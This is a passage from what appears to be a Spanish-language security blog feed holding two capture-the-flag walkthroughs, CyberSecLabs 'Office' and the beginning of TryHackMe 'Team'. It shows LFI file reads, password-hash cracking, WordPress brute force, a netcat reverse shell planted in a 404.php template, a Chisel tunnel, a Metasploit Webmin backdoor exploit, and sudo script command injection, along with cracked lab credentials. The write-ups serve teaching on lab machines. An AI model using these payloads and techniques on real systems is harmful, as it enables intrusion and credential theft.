Ch\t\u0026#34;/proc/version\u0026#34; 00387: C=200 27 L\t64 W\t2831 Ch\t\u0026#34;/proc/self/status\u0026#34; 00386: C=200 27 L\t64 W\t1519 Ch\t\u0026#34;/proc/self/stat\u0026#34; 00383: C=200 27 L\t64 W\t1131 Ch\t\u0026#34;/proc/self/cmdline\u0026#34; 00385: C=200 27 L\t64 W\t4315 Ch\t\u0026#34;/proc/self/mounts\u0026#34; 00382: C=200 27 L\t64 W\t1779 Ch\t\u0026#34;/proc/net/udp\u0026#34; 00381: C=200 27 L\t64 W\t2095 Ch\t\u0026#34;/proc/net/tcp\u0026#34; 00380: C=200 27 L\t64 W\t2839 Ch\t\u0026#34;/proc/meminfo\u0026#34; 00379: C=200 27 L\t64 W\t1811 Ch\t\u0026#34;/proc/devices\u0026#34; 00378: C=200 27 L\t64 W\t2359 Ch\t\u0026#34;/proc/cpuinfo\u0026#34; 00630: C=200 27 L\t64 W\t5135 Ch\t\u0026#34;/usr/share/adduser/adduser.conf\u0026#34; 00822: C=200 27 L\t64 W\t5355 Ch\t\u0026#34;/var/www/html/wordpress/wp-config.php\u0026#34; Total time: 0 Processed Requests: 1014 Filtered Requests: 932 Requests/sec.: 0   WORDPRESS DWIGHT Enumerando carpetas encontramos que los archivos de la pagina bajo el subdominio forum.office.csl se encuentran en /var/www/html/forum/ lugar donde encontramos el archivo .htpasswd.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  ──(kali㉿kali)-[~/cyberseclabs/office] └─$ curl -s http://forum.office.csl/chatlogs/chatlogs.php?file=php://filter/convert.base64-encode/resource=/var/www/html/forum/.htpasswd| tail \u0026lt;li class=\u0026#34;nav-item\u0026#34;\u0026gt; \u0026lt;a class=\u0026#34;nav-link\u0026#34; href=\u0026#34;../login/login.php\u0026#34;\u0026gt;Login\u0026lt;/a\u0026gt; \u0026lt;/li\u0026gt; \u0026lt;/ul\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/nav\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ZHdpZ2h0OiRhcHIxJDdGQVJFNERFJGxLZ0YvUjlyU1VFWTZzLkw3OS9kTS8K ┌──(kali㉿kali)-[~/cyberseclabs/office] └─$   Utilizamos John para obtener en texto plano la contraseña\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  ┌──(kali㉿kali)-[~/cyberseclabs/office] └─$ echo ZHdpZ2h0OiRhcHIxJDdGQVJFNERFJGxLZ0YvUjlyU1VFWTZzLkw3OS9kTS8K| base64 -d \u0026gt; hash_dwight ┌──(kali㉿kali)-[~/cyberseclabs/office] └─$ john hash_dwight --wordlist=/usr/share/wordlists/rockyou.txt Warning: detected hash type \u0026#34;md5crypt\u0026#34;, but the string is also recognized as \u0026#34;md5crypt-long\u0026#34; Use the \u0026#34;--format=md5crypt-long\u0026#34; option to force loading these as that type instead Using default input encoding: UTF-8 Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 256/256 AVX2 8x3]) Will run 2 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status cowboys1 (dwight) 1g 0:00:00:00 DONE (2021-03-23 21:25) 33.33g/s 76800p/s 76800c/s 76800C/s laurita..abcdefgh Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed ┌──(kali㉿kali)-[~/cyberseclabs/office] └─$   Utilizamos hydra con las contraseñas y usuarios encontrados en el servicio ssh pero ninguna fue valida, de igual forma utilizamos wpscan para el login de wordpress donde si encontramos valida la contraseña de dwight.\n1 2 3 4 5 6 7  [+] Performing password attack on Wp Login against 14 user/s [SUCCESS] - dwight / cowboys1 Trying schnider / cowboys1z64$8 Time: 00:00:04 \u0026lt;=================================================================================================== \u0026gt; (106 / 113) 93.80% ETA: ??:??:?? [!] Valid Combinations Found: | Username: dwight, Password: cowboys1   WWW-DATA - USER Ingresamos a wordpress donde editamos y agregamos una shell inversa en la pagina 404.php, y la \u0026ldquo;ejecutamos\u0026rdquo; visitando un post que no existe (http://office.csl/?p=60) lo cual ejecuto nuestra shell inversa.\n1 2  echo \u0026#34;\u0026lt;h1\u0026gt;Hello There\u0026lt;/h1\u0026gt;\u0026#34;; exec(\u0026#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2\u0026gt;\u0026amp;1|nc 10.10.10.10 1338 \u0026gt;/tmp/f\u0026#39;);   Con ello logramos obtener una shell con el usuario www-data.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  ┌──(kali㉿kali)-[~/cyberseclabs/office] └─$ rlwrap nc -lvp 1338 listening on [any] 1338 ... connect to [10.10.2.155] from office.csl [172.31.3.1] 60550 sh: 0: can\u0026#39;t access tty; job control turned off which python /usr/bin/python python -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; whoami;id;pwd whoami;id;pwd www-data uid=33(www-data) gid=33(www-data) groups=33(www-data) /var/www/html/wordpress www-data@office:/var/www/html/wordpress$   DWIGHT - USER Realizamos una enumeracion basica de sudo y encontramos que nuestro usuario actual puede cambiar a dwight utilizando bash.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  www-data@office:/$ sudo -l -l Matching Defaults entries for www-data on office: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on office: Sudoers entry: RunAsUsers: dwight Options: !authenticate Commands: /bin/bash www-data@office:/$ sudo -u dwight /bin/bash sudo -u dwight /bin/bash dwight@office:/$ whoami; id whoami; id dwight uid=1001(dwight) gid=1001(dwight) groups=1001(dwight) dwight@office:/$   PRIVILEGE ESCALATION Enumerando, encontramos el puerto 10000 el cual esta expuesto pero tal parece no podemos acceder por fuera. Además encontramos que posiblemente este puerto pertenezca a webmin, ya que encontramos un archivo de salida en /webmin-setup.out.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  dwight@office:/$ netstat -ntpl netstat -ntpl (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:10000 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN - tcp6 0 0 :::80 :::* LISTEN - tcp6 0 0 :::22 :::* LISTEN - tcp6 0 0 :::443 :::* LISTEN - dwight@office:/$ head webmin-setup.out head webmin-setup.out *********************************************************************** * Welcome to the Webmin setup script, version 1.890 * *********************************************************************** Webmin is a web-based interface that allows Unix-like operating systems and common Unix services to be easily administered. Installing Webmin in /usr/share/webmin ... *********************************************************************** Webmin uses separate directories for configuration files and log files. dwight@office:/$   Utilizamos Chisel para obtener el puerto 10000 a nuestra maquina local.\n1 2 3 4 5 6  #Local - Kali ./chisel server -p 8181 --reverse #Office Machine #./chisel client \u0026lt;SERVER-IP\u0026gt;:\u0026lt;SERVER-PORT\u0026gt; R:\u0026lt;LOCAL-PORT-DEST\u0026gt;:\u0026lt;IP-TO-REVERSE\u0026gt;:\u0026lt;PORT-TO-REVERSE\u0026gt; ./chisel client 10.10.2.155:8181 R:10000:127.0.0.1:10000   Verificamos que el puerto 10000 y vemos que esta localmente.\n1 2 3 4 5 6 7 8 9 10  ┌──(kali㉿kali)-[~/cyberseclabs] └─$ sudo netstat -ntpl [sudo] password for kali: Active Internet connections (only servers) Proto Recv-Q Send-Q Local Address Foreign Address State PID/Program name tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN 7664/python3 tcp6 0 0 :::10000 :::* LISTEN 7689/./chisel tcp6 0 0 127.0.0.1:8080 :::* LISTEN 4358/java tcp6 0 0 :::8181 :::* LISTEN 7689/./chisel tcp6 0 0 127.0.0.1:37077 :::* LISTEN 4358/java   Visitamos dicho puerto en firefox y confirmamos que es webmin.\nVerificamos la version mediante una solicitud con curl y vemos en los headers que la version es MiniServ/1.890.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  HTTP/1.0 200 Document follows Date: Wed, 24 Mar 2021 02:04:32 GMT Server: MiniServ/1.890 Connection: close Auth-type: auth-required=1 Set-Cookie: redirect=1; path=/ Set-Cookie: testing=1; path=/ X-Frame-Options: SAMEORIGIN Content-Security-Policy: script-src \u0026#39;self\u0026#39; \u0026#39;unsafe-inline\u0026#39; \u0026#39;unsafe-eval\u0026#39;; frame-src \u0026#39;self\u0026#39;; child-src \u0026#39;self\u0026#39; Content-type: text/html; Charset=UTF-8 \u0026lt;!DOCTYPE HTML\u0026gt; \u0026lt;html data-background-style=\u0026#34;gainsboro\u0026#34; class=\u0026#34;session_login\u0026#34;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;noscript\u0026gt; \u0026lt;style\u0026gt; html[data-background-style=\u0026#34;gainsboro\u0026#34;] { background-color: #d6d6d6; } html[data-background-style=\u0026#34;nightRider\u0026#34;] { background-color: #1a1c20; } html[data-background-style=\u0026#34;nightRider\u0026#34;] div[data-noscript] { color: #979ba080; } html[data-slider-fixed=\u0026#39;1\u0026#39;] { margin-right: 0 !important; } body \u0026gt; div[data-noscript] ~ * { display: none !important; } div[data-noscript] { visibility: hidden; animation: 2s noscript-fadein; animation-delay: 1s; text-align: center; animation-fill-mode: forwards; } @keyframes noscript-fadein { 0% { opacity: 0; } 100% { visibility: visible; opacity: 1; } } \u0026lt;/style\u0026gt; \u0026lt;div data-noscript\u0026gt; \u0026lt;div class=\u0026#34;fa fa-3x fa-exclamation-triangle margined-top-20 text-danger\u0026#34;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;h2\u0026gt;JavaScript is disabled\u0026lt;/h2\u0026gt; \u0026lt;p\u0026gt;Please enable javascript and refresh the page\u0026lt;/p\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/noscript\u0026gt; \u0026lt;meta charset=\u0026#34;utf-8\u0026#34;\u0026gt; \u0026lt;title\u0026gt;Login to Webmin\u0026lt;/title\u0026gt; \u0026lt;link rel=\u0026#34;shortcut icon\u0026#34; href=\u0026#34;/images/favicon-webmin.ico\u0026#34;\u0026gt; \u0026lt;meta name=\u0026#34;viewport\u0026#34; content=\u0026#34;width=device-width, initial-scale=1.0\u0026#34;\u0026gt; \u0026lt;link href=\u0026#34;/unauthenticated/css/bundle.min.css?1919999999999911\u0026#34; rel=\u0026#34;stylesheet\u0026#34;\u0026gt; \u0026lt;script\u0026gt;setTimeout(function(){var a=document.querySelectorAll(\u0026#39;input[type=\u0026#34;password\u0026#34;]\u0026#39;);i=0;   Realizamos una busqueda de posibles vulnerabilidades y exploits para esta version y encontramos un exploit de metasploit que podria afectar a la version de webmin ya que no necesita de credenciales y afecta a versiones 1.920. Configuramos dicho exploit y logramos obtener una shell con usuario root y nuestra flag system.txt.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  msf6 exploit(linux/http/webmin_backdoor) \u0026gt; run [*] Started reverse TCP handler on 10.10.2.155:4444 [*] Executing automatic check (disable AutoCheck to override) [+] The target is vulnerable. [*] Configuring Automatic (Unix In-Memory) target [*] Sending cmd/unix/reverse_perl command payload [*] Command shell session 1 opened (10.10.2.155:4444 -\u0026gt; 172.31.3.1:42076) at 2021-03-23 22:09:01 -0400 which python /usr/bin/python python -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; root@office:/usr/share/webmin/# whoami;id;pwd whoami;id;pwd root uid=0(root) gid=0(root) groups=0(root) /usr/share/webmin root@office:/usr/share/webmin/# cd /root cd /root root@office:~# ls ls system.txt root@office:~# cat system.txt cat system.txt 39bd970[... REDACTED ...]e6fe6130 root@office:~#   ","description":"Office es una maquina de CyberSecLabs, enumeramos subdominios para toparnos con una lista de usuarios y además encontramos una vulnerabilidad LFI que nos permitio leer y crackear hashes para ingresar a WordPress. Cambiamos al siguiente usuario con Sudo y Bash. Finalmente obtuvimos el puerto de Webmin ejecutando un Tunnel con Chisel que nos permitio explotar una vulnerabilidad para acceder como usuario root.","id":16,"section":"posts","tags":["lfi","wordpress","wpscan","php","chisel","wfuzz","rce","webmin"],"title":"CyberSecLabs - Office","uri":"https://sckull.github.io/posts/office/"},{"content":"  Team es una maquina de TryHackMe, encontramos credenciales en el servicio FTP que nos llevaron a un nuevo subdominio donde descubrimos un LFI para luego enumerar los archivos y encontrar una clave privada para acceder por SSH. Cambiamos al siguiente usuario tras ejecutar un script en bash. Escalamos privilegios editando un ficher utilizado por un CronJob.\nRoom    Titulo Team      Descripción Beginner friendly boot2root machine   Puntos 60   Dificultad Facil   Maker dalemazza     NMAP Escaneo de puertos con nmap nos muestra el puerto ftp (21), http (80) y el puerto ssh (22) abiertos.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29  Nmap 7.91 scan initiated Tue Mar 23 02:30:37 2021 as: nmap -p- --min-rate 10000 -oN allports 10.10.65.146 Nmap scan report for 10.10.65.146 (10.10.65.146) Host is up (0.27s latency). Not shown: 65532 filtered ports PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http # Nmap done at Tue Mar 23 02:31:41 2021 -- 1 IP address (1 host up) scanned in 63.96 seconds # Nmap 7.91 scan initiated Tue Mar 23 02:32:33 2021 as: nmap -p 21,22,80 -sV -sC -oN serviceports 10.10.65.146 Nmap scan report for 10.10.65.146 (10.10.65.146) Host is up (0.35s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 79:5f:11:6a:85:c2:08:24:30:6c:d4:88:74:1b:79:4d (RSA) | 256 af:7e:3f:7e:b4:86:58:83:f1:f6:a2:54:a6:9b:ba:ad (ECDSA) |_ 256 26:25:b0:7b:dc:3f:b2:94:37:12:5d:cd:06:98:c7:9f (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works! If you see this add \u0026#39;te... Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Tue Mar 23 02:32:51 2021 -- 1 IP address (1 host up) scanned in 18.06 seconds   HTTP Encontramos en la pagina web el dominio team.thm.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  HTTP/1.1 200 OK Date: Tue, 23 Mar 2021 06:36:28 GMT Server: Apache/2.4.29 (Ubuntu) Last-Modified: Sat, 16 Jan 2021 14:11:21 GMT ETag: \u0026#34;2c66-5b90510390674\u0026#34; Accept-Ranges: bytes Content-Length: 11366 Vary: Accept-Encoding Content-Type: text/html \u0026lt;!DOCTYPE html PUBLIC \u0026#34;-//W3C//DTD XHTML 1.0 Transitional//EN\u0026#34; \u0026#34;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\u0026#34;\u0026gt; \u0026lt;html xmlns=\u0026#34;http://www.w3.org/1999/xhtml\u0026#34;\u0026gt; \u0026lt;!-- Modified from the Debian original for Ubuntu Last updated: 2014-03-19 See: https://launchpad.net/bugs/1288690 --\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta http-equiv=\u0026#34;Content-Type\u0026#34; content=\u0026#34;text/html; charset=UTF-8\u0026#34; /\u0026gt; \u0026lt;title\u0026gt;Apache2 Ubuntu Default Page: It works! If you see this add \u0026#39;team.thm\u0026#39; to your hosts!\u0026lt;/title\u0026gt; \u0026lt;style type=\u0026#34;text/css\u0026#34; media=\u0026#34;screen\u0026#34;\u0026gt; * { margin: 0px 0px 0px 0px; padding: 0px 0px 0px 0px; }   GOBUSTER Realizamos una enumeracion a la pagina del dominio encontrado, vemos la carpeta /script/ y /assets/, a las cuales se realizó una enumeracion recursiva.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  #team.thm /assets (Status: 301) /images (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /robots.txt (Status: 200) /robots.txt (Status: 200) /scripts (Status: 301) /server-status (Status: 403) #team.thm/assets/ /css (Status: 301) /fonts (Status: 301) /js (Status: 301) #team.thm/scripts/ /script.txt (Status: 200)   Encotramos un archivo de texto el cual contiene lo que pareciera ser un script para un \u0026ldquo;servidor\u0026rdquo; ftp. Además contiene un comentario en el que indica que existe el mismo archivo con una extension diferente y que contiene credenciales en este.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  ┌──(kali㉿kali)-[~/thm/teamcw] └─$ curl -s http://team.thm/scripts/script.txt #!/bin/bash read -p \u0026#34;Enter Username: \u0026#34; REDACTED read -sp \u0026#34;Enter Username Password: \u0026#34; REDACTED echo ftp_server=\u0026#34;localhost\u0026#34; ftp_username=\u0026#34;$Username\u0026#34; ftp_password=\u0026#34;$Password\u0026#34; mkdir /home/username/linux/source_folder source_folder=\u0026#34;/home/username/source_folder/\u0026#34; cp -avr config* $source_folder dest_folder=\u0026#34;/home/username/linux/dest_folder/\u0026#34; ftp -in $ftp_server \u0026lt;\u0026lt;END_SCRIPT quote USER $ftp_username quote PASS $decrypt cd $source_folder !cd $dest_folder mget -R * quit # Updated version of the script # Note to self had to change the extension of the old \u0026#34;script\u0026#34; in this folder, as it has creds in   WFUZZ Realizamos una enumeracion de extensiones utilizando WFUZZ con un wordlist de extensiones.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  ┌──(kali㉿kali)-[~/thm/teamcw] └─$ wfuzz -c -w fuzz.txt --sc 200 http://team.thm/scripts/script.FUZZ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://team.thm/scripts/script.FUZZ Total requests: 4833 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000003247: 200 18 L 44 W 466 Ch \u0026#34;old\u0026#34; Total time: 0 Processed Requests: 4833 Filtered Requests: 4832 Requests/sec.: 0   Encontramos la extension .old. En el archivo encontramos un usuario y contraseña del servicio ftp.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  ┌──(kali㉿kali)-[~/thm/teamcw] └─$ curl -s http://team.thm/scripts/script.old #!/bin/bash read -p \u0026#34;Enter Username: \u0026#34; ftpuser read -sp \u0026#34;Enter Username Password: \u0026#34; T3@m$h@r3 echo ftp_server=\u0026#34;localhost\u0026#34; ftp_username=\u0026#34;$Username\u0026#34; ftp_password=\u0026#34;$Password\u0026#34; mkdir /home/username/linux/source_folder source_folder=\u0026#34;/home/username/source_folder/\u0026#34; cp -avr config* $source_folder dest_folder=\u0026#34;/home/username/linux/dest_folder/\u0026#34; ftp -in $ftp_server \u0026lt;\u0026lt;END_SCRIPT quote USER $ftp_username quote PASS $decrypt cd $source_folder !cd $dest_folder mget -R * quit   FTP Ingresamos al servicio FTP con las credenciales encontradas. Vemos un archivo el cual contiene una nota del usuario Dale, el cual indica que hay una pagina web PHP en desarrollo y se encuentra bajo el subdominio .dev, además debemos de colocar nuestra clave ìd_rsa en el archivo de configuracion.\n1 2 3 4 5 6 7 8 9  ┌──(kali㉿kali)-[~/thm/teamcw] └─$ cat New_site.txt Dale I have started coding a new website in PHP for the team to use, this is currently under development. It can be found at \u0026#34;.dev\u0026#34; within our domain. Also as per the team policy please make a copy of your \u0026#34;id_rsa\u0026#34; and place this in the relevent config file. Gyles   DEV DALE SITE - LFI Agregamos a nuestro archivo /etc/hosts el subdominio dev.team.thm. En este subdominio encontramos una pagina que contiene una direccion.\n1 2 3 4 5 6 7 8 9 10 11  ┌──(kali㉿kali)-[~/thm/teamcw] └─$ curl -s http://dev.team.thm/ \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;UNDER DEVELOPMENT\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; Site is being built\u0026lt;a href=script.php?page=teamshare.php \u0026lt;/a\u0026gt; \u0026lt;p\u0026gt;Place holder link to team share\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;   En la direccion o pagina obtiene un parametro en la variable page, despues de modificar el valor encontramos que existe una vulnerabilidad LFI.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36  ┌──(kali㉿kali)-[~/thm/teamcw] └─$ curl -s http://dev.team.thm/script.php?page=teamshare.php \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Team Share\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; Place holder for future team share \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ┌──(kali㉿kali)-[~/thm/teamcw] └─$ curl -s http://dev.team.thm/script.php?page=index.php \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;UNDER DEVELOPMENT\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; Site is being built\u0026lt;a href=script.php?page=teamshare.php \u0026lt;/a\u0026gt; \u0026lt;p\u0026gt;Place holder link to team share\u0026lt;/p\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ┌──(kali㉿kali)-[~/thm/teamcw] └─$ curl -s http://dev.team.thm/script.php?page=/etc/passwd | head root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin   Realizamos la enumeracion de los usuarios con carpeta principal con lo cual logramos obtener nuestra flag user.txt.\n1 2 3 4 5 6 7 8 9 10 11 12  ┌──(kali㉿kali)-[~/thm/teamcw] └─$ curl -s http://dev.team.thm/script.php?page=/etc/passwd |grep \u0026#34;/home\u0026#34; syslog:x:102:106::/home/syslog:/usr/sbin/nologin dale:x:1000:1000:anon,,,:/home/dale:/bin/bash gyles:x:1001:1001::/home/gyles:/bin/bash ftpuser:x:1002:1002::/home/ftpuser:/bin/sh ┌──(kali㉿kali)-[~/thm/teamcw] └─$ curl -s http://dev.team.thm/script.php?page=/home/dale/user.txt THM{[...REDACTED...]}   DALE - USER Despues de un intento fallido de obtener las claves privadas de los usuarios existentes, utilizamos un wordlist con WFUZZ para enumerar archivos que nos ayuden a obtener acceso a la maquina. Logramos obtener una lista de archivos, con los cuales logramos obtener informacion de la maquina. Realizando una lectura de cada archivo encontramos en el archivo /etc/ssh/sshd_config la clave privada del usuario Dale.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43  ┌──(kali㉿kali)-[~/thm/teamcw] └─$ wfuzz -c -w lfi_paths.txt --hh 1 http://dev.team.thm/script.php?page=FUZZ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz\u0026#39;s documentation for more information. ******************************************************** * Wfuzz 3.1.0 - The Web Fuzzer * ******************************************************** Target: http://dev.team.thm/script.php?page=FUZZ Total requests: 1014 ===================================================================== ID Response Lines Word Chars Payload ===================================================================== 000000015: 200 230 L 1119 W 7313 Ch \u0026#34;/etc/apache2/apache2.conf\u0026#34; [... REDACTED ...] 000000162: 200 13 L 17 W 383 Ch \u0026#34;/etc/os-release\u0026#34; 000000164: 200 16 L 59 W 553 Ch \u0026#34;/etc/pam.conf\u0026#34; 000000197: 200 19 L 113 W 736 Ch \u0026#34;/etc/resolv.conf\u0026#34; 000000184: 200 28 L 97 W 582 Ch \u0026#34;/etc/profile\u0026#34; 000000165: 200 34 L 42 W 1698 Ch \u0026#34;/etc/passwd\u0026#34; 000000166: 200 34 L 42 W 1696 Ch \u0026#34;/etc/passwd-\u0026#34; 000000219: 200 12 L 70 W 420 Ch \u0026#34;/etc/security/sepermit.conf\u0026#34; 000000220: 200 66 L 412 W 2180 Ch \u0026#34;/etc/security/time.conf\u0026#34; 000000216: 200 74 L 499 W 2973 Ch \u0026#34;/etc/security/pam_env.conf\u0026#34; 000000214: 200 29 L 217 W 1441 Ch \u0026#34;/etc/security/namespace.conf\u0026#34; 000000213: 200 57 L 347 W 2151 Ch \u0026#34;/etc/security/limits.conf\u0026#34; 000000210: 200 107 L 663 W 3636 Ch \u0026#34;/etc/security/group.conf\u0026#34; 000000206: 200 123 L 802 W 4621 Ch \u0026#34;/etc/security/access.conf\u0026#34; 000000260: 200 160 L 955 W 5937 Ch \u0026#34;/etc/vsftpd.conf\u0026#34; 000000252: 200 5 L 45 W 404 Ch \u0026#34;/etc/updatedb.conf\u0026#34; 000000248: 200 2 L 1 W 15 Ch \u0026#34;/etc/timezone\u0026#34; 000000246: 200 78 L 339 W 2684 Ch \u0026#34;/etc/sysctl.conf\u0026#34; 000000240: 200 169 L 447 W 5990 Ch \u0026#34;/etc/ssh/sshd_config\u0026#34; 000000379: 200 59 L 114 W 538 Ch \u0026#34;/proc/devices\u0026#34; [... REDACTED ...] 000000630: 200 89 L 467 W 3029 Ch \u0026#34;/usr/share/adduser/adduser.conf\u0026#34; Total time: 0 Processed Requests: 1014 Filtered Requests: 933 Requests/sec.: 0   Utilizamos la clave privada con lo que logramos obtener una shell con el usuario Dale.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20  ┌──(kali㉿kali)-[~/thm/teamcw] └─$ curl -s http://dev.team.thm/script.php?page=/etc/ssh/sshd_config [... REDACTED ..] ----BEGIN OPENSSH PRIVATE KEY----- #b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn #NhAAAAAwEAAQAAAYEAng6KMTH3zm+6rqeQzn5HLBjgruB9k2rX/XdzCr6jvdFLJ+uH4ZVE [.. REDACTED ..] #CPFMeoYeUdghftAAAAE3A0aW50LXA0cnJvdEBwYXJyb3QBAgMEBQYH #-----END OPENSSH PRIVATE KEY----- ┌──(kali㉿kali)-[~/thm/teamcw] └─$ ssh -i dale_id_rsa dale@10.10.151.176 130 ⨯ Last login: Mon Jan 18 10:51:32 2021 dale@TEAM:~$ whoami; id; pwd dale uid=1000(dale) gid=1000(dale) groups=1000(dale),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd),113(lpadmin),114(sambashare),1003(editors) /home/dale dale@TEAM:~$   GYLES - USER Realizamos una pequeña enumeracion y vemos que el usuario actual tiene permisos root mediante sudo ejecutar el script admmin_checks, además tiene permisos de lectura.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15  dale@TEAM:~$ sudo -l -l Matching Defaults entries for dale on TEAM: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User dale may run the following commands on TEAM: Sudoers entry: RunAsUsers: gyles Options: !authenticate Commands: /home/gyles/admin_checks dale@TEAM:~$ ls -lah /home/gyles/admin_checks -rwxr--r-- 1 gyles editors 399 Jan 15 21:52 /home/gyles/admin_checks dale@TEAM:~$ groups dale adm cdrom sudo dip plugdev lxd lpadmin sambashare editors   El script realiza la ejecucion del comando date solo si este se le pasa, en tal caso imprime una fecha y con este crea un archivo.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  dale@TEAM:~$ cat /home/gyles/admin_checks #!/bin/bash printf \u0026#34;Reading stats.\\n\u0026#34; sleep 1 printf \u0026#34;Reading stats..\\n\u0026#34; sleep 1 read -p \u0026#34;Enter name of person backing up the data: \u0026#34; name echo $name \u0026gt;\u0026gt; /var/stats/stats.txt read -p \u0026#34;Enter \u0026#39;date\u0026#39; to timestamp the file: \u0026#34; error # Pregunta por date printf \u0026#34;The Date is \u0026#34; $error 2\u0026gt;/dev/null # Ejecuta date date_save=$(date \u0026#34;+%F-%H-%M\u0026#34;) cp /var/stats/stats.txt /var/stats/stats-$date_save.bak printf \u0026#34;Stats have been backed up\\n\u0026#34;   Para tomar ventaja de esto pasamos /bin/bash en lugar de date para obtener una shell con el usuario gyles.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  dale@TEAM:~$ sudo -u gyles /home/gyles/admin_checks Reading stats. Reading stats.. Enter name of person backing up the data: batman Enter \u0026#39;date\u0026#39; to timestamp the file: /bin/bash The Date is whoami;id gyles uid=1001(gyles) gid=1001(gyles) groups=1001(gyles),1003(editors),1004(admin) which python which python3 /usr/bin/python3 python3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;);\u0026#39; gyles@TEAM:~$ pwd /home/dale gyles@TEAM:~$ cd /home gyles@TEAM:/home$ cd 